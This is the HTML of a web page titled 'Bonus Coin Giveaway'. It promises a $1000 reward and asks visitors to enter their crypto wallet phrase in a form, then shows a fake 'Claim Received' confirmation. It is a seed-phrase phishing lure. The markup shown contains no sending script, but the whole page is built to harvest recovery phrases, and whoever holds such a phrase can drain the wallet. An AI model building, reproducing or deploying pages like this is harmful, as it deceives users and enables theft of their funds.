<html lang="en">  <head>    <meta charset="UTF-8">  <meta

> 

  <title>  
    Bonus Coin Giveaway  
  </title>    <link  
    rel="stylesheet"  
    href="style.css"  
  >  </head>  <body>  <header>    <div class="brand">  <div class="coin">  
  ₿  
</div>  

<span>  
  BONUS COIN GIVEAWAY  
</span>

  </div>  </header>  <main>    <section class="hero">  <h1>  
  Bonus Coin Giveaway  
</h1>  

<p>  
  Submit your wallet Phrase and claim  
</p>

  </section>    <section  
    class="card"  
    id="claimCard"  
  >  <div class="qr">  

  <div class="finder one"></div>  

  <div class="finder two"></div>  

  <div class="finder three"></div>  

  <div class="grid"></div>

<h2>  
  Claim your $1000  
</h2>  


<p class="muted">  
  Claim amount  
</p>  


<form id="claimForm">  


  <label for="wallet">  
    Enter your phrase to Receive your Bonus  
  </label>  


  <input  
    id="wallet"  
    type="text"  
    placeholder="Input phrase"  
    autocomplete="off"  
    required  
  >  


  <p class="notice">  

      

  </p>  


  <button  
    id="submitBtn"  
    type="submit"  
  >  

    Claim  

  </button>  


  <p  
    id="error"  
    class="error"  
  ></p>  


</form>

  </section>    <section  
    class="card hidden"  
    id="resultCard"  
  >  <div class="check">  
  ✓  
</div>  


<h2>  
  Claim Received  
</h2>  


<p class="muted">  
  Your claim has entered the workflow.  
</p>  


<div class="row">  

  <span>  
    Claim ID  
  </span>  

  <b id="claimId"></b>  

</div>  


<div class="row">  

  <span>  
    Status  
  </span>  

  <b id="claimStatus"></b>  

</div>  


<div class="row">  

  <span>  
    Wallet  
  </span>  

  <b id="claimWallet"></b>  

</div>  


<button  
  class="secondary"  
  id="backBtn"  
>  

  Back  

</button>

  </section>    <footer>  Blockchain funds only.
